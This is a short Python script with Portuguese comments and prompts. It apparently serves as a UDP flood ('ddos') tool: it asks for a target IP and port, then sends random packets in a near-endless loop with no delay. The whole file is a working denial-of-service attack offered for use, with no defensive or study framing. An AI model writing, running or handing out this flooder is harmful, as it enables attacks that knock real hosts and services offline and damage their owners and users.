import socket
import os
import time
from colorama import Fore, Style, init

# Inicia o colorama
init()

# Função para iniciar o envio de pacotes UDP
def ddos(target_ip, target_port):
    print(Fore.CYAN + "Aguarde 5 segundos para iniciar o envio de pacotes..." + Style.RESET_ALL)
    time.sleep(5)  # Atraso de 5 segundos
    print(Fore.GREEN + "Envio de pacotes iniciado com sucesso!" + Style.RESET_ALL)

    # Cria um socket UDP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        for i in range(1, 1000000000000000000000000):  # Ajuste aqui o número de pacotes
            data = os.urandom(10)  # Gera 10 bytes aleatórios
            s.sendto(data, (target_ip, target_port))
            print(Fore.RED + f"Pacote {i} enviado para {target_ip}:{target_port}" + Style.RESET_ALL)
            time.sleep(0.0)  # Pausa entre pacotes (evita sobrecarga)
    except Exception as e:
        print(Fore.RED + f"Erro durante o envio de pacotes: {e}" + Style.RESET_ALL)
    finally:
        s.close()
        print(Fore.BLUE + "Envio de pacotes concluído." + Style.RESET_ALL)

# Recebe o IP e a porta do usuário
try:
    ip = input(Fore.BLUE + "Digite o IP de destino: " + Style.RESET_ALL)
    port = int(input(Fore.BLUE + "Digite a porta de destino (ex: 443): " + Style.RESET_ALL))

    # Validações básicas
    if not ip or not port:
        raise ValueError("IP ou porta não podem estar vazios.")

    # Chama a função para iniciar o envio de pacotes
    ddos(ip, port)

except ValueError as ve:
    print(Fore.RED + f"Erro: {ve}" + Style.RESET_ALL)
except KeyboardInterrupt:
    print(Fore.YELLOW + "Execução interrompida pelo usuário." + Style.RESET_ALL)
    
